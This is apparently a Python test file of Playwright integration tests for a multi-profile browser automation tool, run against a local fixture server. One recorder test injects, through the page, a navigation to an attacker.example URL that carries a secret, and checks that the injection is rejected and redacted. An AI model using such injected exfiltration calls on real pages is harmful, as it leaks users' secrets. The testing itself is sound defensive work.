"""Real Playwright integration: shared driver, graph, recorder, manual window close.

Requires AUTUMN_E2E=1 and Playwright-managed browser binaries. No public
services, anti-abuse sites, or real user data involved.
"""
from __future__ import annotations

import asyncio
import os
import tempfile
import threading
import time
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from autumn_genlogin.models import Profile
from autumn_genlogin.storage import Store
from autumn_genlogin.browser_shared import SharedBrowserManager
from autumn_genlogin.graph import steps_to_graph


class Fixture(BaseHTTPRequestHandler):
    def do_GET(self):
        data=(b'<html><body><h1 id="title">Autumn test</h1>'
              b'<input id="secret" value="" />'
              b'<select id="category"><option value="">none</option><option value="sensitive-unique-option">sensitive</option></select>'
              b'<button id="press" data-autumn-qa-click="1">Push</button>'
              b'<script>document.querySelector("#press").onclick=()=>{document.body.dataset.clicked="yes"}</script>'
              b'</body></html>')
        self.send_response(200)
        self.send_header("Content-Type","text/html")
        self.send_header("Content-Length",str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self,*args):pass


def eventually(predicate,timeout=25):
    until=time.monotonic()+timeout
    while time.monotonic()<until:
        if predicate():return True
        time.sleep(0.1)
    return False


@unittest.skipUnless(os.environ.get("AUTUMN_E2E")=="1", "requires Playwright browser binaries")
class SharedBrowserRealTests(unittest.TestCase):
    def setUp(self):
        self.tmp=tempfile.TemporaryDirectory()
        self.store=Store(Path(self.tmp.name))
        self.server=ThreadingHTTPServer(("127.0.0.1",0),Fixture)
        self.thread=threading.Thread(target=self.server.serve_forever,daemon=True)
        self.thread.start()
        self.origin=f"http://127.0.0.1:{self.server.server_port}"
        self.manager=SharedBrowserManager(self.store,headless=True)

    def tearDown(self):
        self.manager.stop_all()
        self.assertTrue(eventually(lambda:self.manager.count()==0,timeout=20),
                        "Browser sessions did not close and release locks")
        self.manager.close_driver()
        self.server.shutdown();self.server.server_close()
        self.thread.join(timeout=5)
        # Chromium can still be releasing WebStorage files on Windows after
        # the transport shuts down. Retry only the filesystem cleanup; fail
        # explicitly if locks persist. Never silently ignore leaked sessions.
        for attempt in range(25):
            try:
                self.tmp.cleanup()
                break
            except PermissionError:
                if attempt == 24: raise
                time.sleep(0.2)

    def test_two_profiles_share_one_driver_and_graph_executes(self):
        profiles=[]
        for name in ("one","two"):
            profiles.append(self.store.save(Profile(name=name,browser="chromium",start_url=self.origin)))
        self.manager.start(profiles[0].id)
        self.manager.start(profiles[1].id)
        self.assertTrue(eventually(lambda:any(x[1:]==("status","Running") for x in list(self.manager.events.queue))))
        self.assertTrue(eventually(lambda:all(self.manager._sessions[p.id].ready.is_set() for p in profiles)))
        self.assertEqual(self.manager.count(),2)
        # One Python/Node Playwright driver, independent persistent contexts.
        self.assertIsNotNone(self.manager._playwright)
        self.assertTrue(self.manager._thread.is_alive())
        self.manager.run_graph(profiles[0].id,steps_to_graph([{"action":"extract_text","selector":"#title"}]))
        self.assertTrue(eventually(lambda:(self.manager.last_run(profiles[0].id) or {}).get("status")=="succeeded"))
        self.assertEqual(self.manager.last_run(profiles[0].id)["extracted"][0]["text"],"Autumn test")
        self.assertIsNone(self.manager.last_run(profiles[1].id))
        self.manager.stop(profiles[0].id)
        self.assertTrue(eventually(lambda:not self.manager.active(profiles[0].id)))
        self.assertTrue(self.manager.active(profiles[1].id))

    def test_scheduled_run_records_real_browser_execution(self):
        """Real browser automation acknowledges completion through the journal."""
        from datetime import datetime, timedelta, timezone
        from autumn_genlogin.scheduler import ScheduleStore, Scheduler

        profile = self.store.save(Profile(name="scheduled", browser="chromium",start_url=self.origin))
        schedules = ScheduleStore(self.store)
        job_id = schedules.add(profile.id,
            [{"action":"wait_for","selector":"#title"},{"action":"extract_text","selector":"#title"}],
            datetime.now(timezone.utc)-timedelta(minutes=1))

        def dispatch_job(job):
            self.manager.start_workflow(
                job.profile_id, job.workflow, run_id=job.dispatch_id,
                on_finish=lambda status,error,ident=job.dispatch_id:
                    schedules.record_completion(ident,status,error))

        scheduler = Scheduler(schedules,self.manager.start_workflow,
                              dispatch_job=dispatch_job,interval=0.05)
        scheduler.start()
        try:
            self.assertTrue(eventually(lambda:
                bool(schedules.history(job_id)) and
                schedules.history(job_id)[0].status in ("succeeded","failed","cancelled"),timeout=40))
        finally:
            scheduler.stop()

        record = schedules.history(job_id)[0]
        self.assertEqual(record.status,"succeeded",record.error_type)
        self.assertIsNotNone(record.finished_utc)
        self.assertEqual(schedules.list()[0].last_status,"succeeded")
        # Extracted text must not be written to SQLite.
        import sqlite3
        from contextlib import closing
        # sqlite3.Connection.__exit__ commits but does not close its Windows
        # file handle. Explicit closing is required before tempdir teardown.
        with closing(sqlite3.connect(self.store.db)) as conn:
            raw = str(conn.execute("SELECT * FROM schedule_runs").fetchall())
        self.assertNotIn("Autumn test",raw)
        self.assertTrue(eventually(lambda:not self.manager.active(profile.id),timeout=20))

    def test_real_browser_batch_runs_three_isolated_profiles(self):
        from autumn_genlogin.batch import BatchRunner

        ids=[]
        for name in ("batch-a","batch-b","batch-c"):
            ids.append(self.store.save(Profile(name=name,browser="chromium",start_url=self.origin)).id)
        runner=BatchRunner(self.store,self.manager)
        batch_id=runner.start(ids,[
            {"action":"wait_for","selector":"#title"},
            {"action":"extract_text","selector":"#title"}
        ],max_parallel=2)
        self.assertTrue(eventually(lambda:runner.get(batch_id)["status"] in
                         ("succeeded","partial","cancelled"),timeout=60))
        report=runner.get(batch_id)
        self.assertEqual(report["status"],"succeeded",report["items"])
        self.assertEqual([i["profile_id"] for i in report["items"]],ids)
        self.assertEqual({i["status"] for i in report["items"]},{"succeeded"})
        self.assertNotIn("Autumn test",str(report))
        # Actual browser completions, not the initial "submitted" state,
        # must survive construction of a new BatchRunner after completion.
        from autumn_genlogin.batch_history import BatchJournal
        imported = BatchJournal(Store(Path(self.tmp.name))).get(batch_id)
        self.assertEqual(imported["status"],"succeeded")
        self.assertEqual({i["status"] for i in imported["items"]},{"succeeded"})
        self.assertNotIn("Autumn test",str(imported))
        self.assertTrue(eventually(lambda:all(not self.manager.active(pid) for pid in ids),timeout=20))
        self.assertTrue(runner.wait(batch_id,timeout=20),
                        "Real Chromium batch threads must close SQLite handles before Windows cleanup")

    def test_graph_capture_text_passes_browser_data_without_logging_or_persisting(self):
        """Real Chromium: capture local heading, fill input, keep value transient."""
        profile=self.store.save(Profile(name="graph-capture",browser="chromium",start_url=self.origin))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(s:=self.manager._sessions.get(profile.id))
                                  is not None and s.ready.is_set()))
        graph={
            "format":"AutumnGenLogin/graph-1",
            "nodes":[
                {"id":"start","type":"start"},
                {"id":"capture","type":"capture_text","name":"headline","selector":"#title"},
                {"id":"fill","type":"action","step":{
                    "action":"fill","selector":"#secret","text":"{{headline}}"}},
                {"id":"end","type":"end"},
            ],
            "edges":[
                {"from":"start","to":"capture","branch":"next"},
                {"from":"capture","to":"fill","branch":"next"},
                {"from":"fill","to":"end","branch":"next"},
            ],
        }
        self.manager.run_graph(profile.id,graph)
        self.assertTrue(eventually(lambda:(self.manager.last_run(profile.id) or {}).get("status")
                                  in ("succeeded","failed"),timeout=30))
        result=self.manager.last_run(profile.id)
        self.assertEqual(result["status"],"succeeded",result["error"])
        async def check():
            page=self.manager._sessions[profile.id].context.pages[0]
            return await page.locator("#secret").input_value()
        self.assertEqual(self.manager._submit(check()).result(timeout=15),"Autumn test")
        self.assertEqual(result["extracted"],[])
        self.assertNotIn("Autumn test",str(list(self.manager.events.queue)))
        self.manager.stop(profile.id)

    def test_local_only_live_mirror_clicks_across_three_open_chromium_profiles(self):
        """One real master click propagates to two isolated synthetic QA pages."""
        from autumn_genlogin.qa_sync import LocalQASynchronizer
        profiles=[self.store.save(Profile(name=f"qa-mirror-{i}",browser="chromium",
                                          group_name="QA",start_url=self.origin))
                  for i in range(3)]
        for profile in profiles:
            self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:all(
            (s:=self.manager._sessions.get(profile.id)) is not None and
            s.ready.is_set() and s.context is not None
            for profile in profiles),timeout=30))
        mirror=LocalQASynchronizer(self.manager)
        start=mirror.start(profiles[0].id,[p.id for p in profiles[1:]])
        self.assertTrue(start["active"])
        self.assertEqual(start["origin"],self.origin)
        async def master_click():
            page=self.manager._sessions[profiles[0].id].context.pages[0]
            await page.locator("#press").click()
        self.manager._submit(master_click()).result(timeout=15)
        async def all_followers_clicked():
            results=[]
            for profile in profiles[1:]:
                page=self.manager._sessions[profile.id].context.pages[0]
                results.append(await page.evaluate("document.body.dataset.clicked==='yes'"))
            return all(results)
        self.assertTrue(eventually(lambda:self.manager._submit(
            all_followers_clicked()).result(timeout=8),timeout=20),
            "Master click did not propagate to both independent QA profiles")
        self.assertEqual(mirror.status()["mirrored_clicks"],2)
        mirror.stop()
        self.assertFalse(mirror.status()["active"])
        async def reset_followers():
            for profile in profiles[1:]:
                page=self.manager._sessions[profile.id].context.pages[0]
                await page.evaluate("delete document.body.dataset.clicked")
        self.manager._submit(reset_followers()).result(timeout=15)
        self.manager._submit(master_click()).result(timeout=15)
        self.assertFalse(self.manager._submit(all_followers_clicked()).result(timeout=15),
                         "Stopping QA sync must disable further mirroring")
        for profile in profiles:
            self.manager.stop(profile.id)

    def test_real_chromium_click_by_opt_in_local_image_template(self):
        """Playwright CSS screenshot -> local OpenCV match -> real mouse click."""
        import importlib.util
        if importlib.util.find_spec("cv2") is None:
            self.skipTest("requires optional OpenCV dependency")
        profile=self.store.save(Profile(name="image-click",browser="chromium",start_url=self.origin))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(s:=self.manager._sessions.get(profile.id))
                                  is not None and s.ready.is_set()))
        async def capture_template():
            page=self.manager._sessions[profile.id].context.pages[0]
            return await page.locator("#press").screenshot(scale="css")
        image=self.manager._submit(capture_template()).result(timeout=20)
        source=Path(self.tmp.name)/"explicit-target.png"
        source.write_bytes(image)
        ident=self.manager.image_templates.import_png(source)
        run_id=self.manager.run_steps(profile.id,[{
            "action":"click_image","template_id":ident,"confidence":0.94
        }])
        self.assertTrue(eventually(lambda:(self.manager.last_run(profile.id) or {}).get("status")
                                  in ("succeeded","failed"),timeout=30))
        result=self.manager.last_run(profile.id)
        self.assertEqual(result["status"],"succeeded",result["error"])
        self.assertEqual(result["id"],run_id)
        async def clicked():
            page=self.manager._sessions[profile.id].context.pages[0]
            return await page.evaluate("document.body.dataset.clicked")
        self.assertEqual(self.manager._submit(clicked()).result(timeout=15),"yes")
        self.assertEqual(result["extracted"],[])
        self.assertNotIn("explicit-target.png",str(list(self.manager.events.queue)))
        self.manager.stop(profile.id)

    def test_cancel_interrupts_inflight_selector_wait_without_closing_profile(self):
        """A cancellation must not wait for Playwright's 20-second selector timeout."""
        profile=self.store.save(Profile(name="cancellable",browser="chromium",start_url=self.origin))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(s:=self.manager._sessions.get(profile.id))
                                  is not None and s.ready.is_set()))
        run_id=self.manager.run_steps(profile.id,[
            {"action":"wait_for","selector":"#never-existent-cancel-test"}])
        self.assertTrue(eventually(lambda:(self.manager.last_run(profile.id) or {}).get("status")=="running"))
        started=time.monotonic()
        self.manager.cancel(profile.id)
        self.assertTrue(eventually(lambda:(self.manager.last_run(profile.id) or {}).get("status")=="cancelled",timeout=5),
                        "Cancel must interrupt a pending locator wait promptly")
        self.assertLess(time.monotonic()-started,5.0)
        self.assertEqual(self.manager.last_run(profile.id)["id"],run_id)
        self.assertTrue(self.manager.active(profile.id),
                        "Cancelling workflow must not close manually opened browser")
        self.manager.stop(profile.id)

    def test_recorder_does_not_mix_tabs_and_only_records_safe_enter_key(self):
        """Real Chromium: foreign tabs are excluded and never pollute replay."""
        profile=self.store.save(Profile(
            name="recorder-single-tab",browser="chromium",start_url=self.origin))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(s:=self.manager._sessions.get(profile.id))
                                  is not None and s.ready.is_set(),timeout=20))
        self.manager.start_recording(profile.id)
        async def demonstrate():
            context=self.manager._sessions[profile.id].context
            chosen=context.pages[0]
            other=await context.new_page()
            await other.goto(self.origin,wait_until="domcontentloaded")
            await other.locator("#press").click()
            await other.locator("#secret").fill("TAB_TWO_PRIVATE_SECRET")
            await other.locator("#secret").dispatch_event("change")
            await chosen.locator("#press").click()
            await chosen.locator("#secret").press("Enter")
        self.manager._submit(demonstrate()).result(timeout=30)
        self.assertTrue(eventually(
            lambda:len(self.manager.recorded_steps(profile.id))>=2,timeout=15))
        self.manager.stop_recording(profile.id)
        report=self.manager.recording_review(profile.id)
        self.assertFalse(report["still_recording"])
        self.assertGreaterEqual(report["ignored_tabs"],1)
        self.assertEqual(report["navigation_boundaries"],0,
                         "Opening another tab must not count as recorded-page navigation")
        self.assertIn("other browser tab", " ".join(report["warnings"]))
        steps=self.manager.recorded_steps(profile.id)
        self.assertEqual(steps,[
            {"action":"click","selector":"#press"},
            {"action":"press","selector":"#secret","key":"Enter"}
        ])
        self.assertNotIn("TAB_TWO_PRIVATE_SECRET",repr(report)+repr(steps))
        # Closing the selected tab cannot silently switch the recorder target
        # to another already-open page.
        self.manager.start_recording(profile.id)
        async def close_selected():
            await self.manager._sessions[profile.id].context.pages[0].close()
        self.manager._submit(close_selected()).result(timeout=15)
        review=self.manager.recording_review(profile.id)
        self.assertFalse(review["still_recording"])
        self.assertTrue(review["selected_tab_closed"])
        self.assertIn("selected tab closed", " ".join(review["warnings"]))
        self.manager.stop(profile.id)

    def test_recorder_rejects_page_injection_and_reviews_navigation_safely(self):
        """Untrusted page binding cannot inject workflow commands or secret values."""
        profile=self.store.save(Profile(name="recorded-review",browser="chromium",start_url=self.origin))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(s:=self.manager._sessions.get(profile.id))
                                  is not None and s.ready.is_set()))
        self.manager.start_recording(profile.id)
        async def demonstrate():
            page=self.manager._sessions[profile.id].context.pages[0]
            # A page itself can invoke exposed bindings. The recording
            # boundary must never accept executable navigation from the page.
            await page.evaluate("""() => window.__autumnRecord({
                action:'goto',url:'https://attacker.example/token?value=PRIVATE_SECRET'})""")
            await page.evaluate("""() => window.__autumnRecord({
                action:'fill',selector:'#secret',text:'PRIVATE_SECRET'})""")
            await page.evaluate("""() => window.__autumnRecord({
                action:'select_option',selector:'#category',value:'PRIVATE_OPTION'})""")
            await page.reload(wait_until="domcontentloaded")
            await page.locator("#press").click()
        self.manager._submit(demonstrate()).result(timeout=30)
        self.assertTrue(eventually(lambda:len(self.manager.recorded_steps(profile.id))>=3))
        steps=self.manager.recorded_steps(profile.id)
        self.assertEqual([s["action"] for s in steps],["fill","select_option","click"])
        self.assertEqual(steps[0]["text"],"")
        self.assertEqual(steps[1]["value"],"REVIEW_OPTION")
        self.assertNotIn("PRIVATE_SECRET",repr(steps))
        self.assertNotIn("PRIVATE_OPTION",repr(steps))
        review=self.manager.recording_review(profile.id)
        self.assertTrue(review["requires_review"])
        self.assertEqual(review["redacted_fields"],2)
        self.assertGreaterEqual(review["navigation_boundaries"],1)
        self.assertNotIn("https://",repr(review))
        self.manager.stop_recording(profile.id)
        self.manager.stop(profile.id)

    def test_user_closes_last_page_and_recorder_redacts_text(self):
        profile=self.store.save(Profile(name="recorder",browser="chromium",start_url=self.origin))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(x:=self.manager._sessions.get(profile.id)) is not None and x.ready.is_set()))
        self.manager.start_recording(profile.id)
        # A real browser click and sensitive input event.
        async def perform():
            session=self.manager._sessions[profile.id]
            page=session.context.pages[0]
            await page.locator("#press").click()
            await page.locator("#secret").fill("do-not-record-password")
            await page.locator("#secret").dispatch_event("change")
            await page.locator("#category").select_option("sensitive-unique-option")
        self.manager._submit(perform()).result(timeout=20)
        self.assertTrue(eventually(lambda:len(self.manager.recorded_steps(profile.id))>=2))
        self.assertNotIn("do-not-record-password",str(self.manager.recorded_steps(profile.id)))
        self.assertNotIn("sensitive-unique-option",str(self.manager.recorded_steps(profile.id)))
        self.assertTrue(any(s.get("value")=="REVIEW_OPTION" for s in self.manager.recorded_steps(profile.id)))
        self.manager.stop_recording(profile.id)
        # Mimic the user closing the last window: do not call manager.stop().
        async def user_close():
            await self.manager._sessions[profile.id].context.pages[0].close()
        self.manager._submit(user_close()).result(timeout=20)
        self.assertTrue(eventually(lambda:not self.manager.active(profile.id)),"Closing last browser window must release OS lease")
        self.assertIsNone(self.manager.last_run(profile.id))
        self.manager.start(profile.id)
        self.assertTrue(eventually(lambda:(x:=self.manager._sessions.get(profile.id)) is not None and x.ready.is_set()))
        self.manager.stop(profile.id)

    def test_branded_chrome_and_edge_smoke(self):
        if os.environ.get("AUTUMN_BRANDED_ENGINE") != "1":
            self.skipTest("requires installed Google Chrome and Microsoft Edge")
        for engine in ("chrome", "msedge"):
            with self.subTest(engine=engine):
                profile=self.store.save(Profile(name=engine,browser=engine,start_url=self.origin))
                self.manager.start(profile.id)
                self.assertTrue(eventually(lambda:((x:=self.manager._sessions.get(profile.id)) is not None and x.ready.is_set())
                                    or not self.manager.active(profile.id),timeout=35),
                                f"{engine} did not resolve startup")
                self.assertTrue(self.manager.active(profile.id),f"{engine} browser closed unexpectedly")
                self.manager.stop(profile.id)
                self.assertTrue(eventually(lambda:not self.manager.active(profile.id),timeout=25))

    def test_multiengine_launch_smoke(self):
        if os.environ.get("AUTUMN_MULTI_ENGINE")!="1":self.skipTest("requires Firefox and WebKit binaries")
        for engine in ("firefox","webkit"):
            with self.subTest(engine=engine):
                profile=self.store.save(Profile(name=engine,browser=engine,start_url=self.origin))
                self.manager.start(profile.id)
                self.assertTrue(eventually(lambda:((x:=self.manager._sessions.get(profile.id)) is not None and x.ready.is_set())
                                    or not self.manager.active(profile.id)))
                self.assertTrue(self.manager.active(profile.id),f"{engine} browser failed to start")
                self.manager.stop(profile.id)
                self.assertTrue(eventually(lambda:not self.manager.active(profile.id)))

if __name__=="__main__":unittest.main()
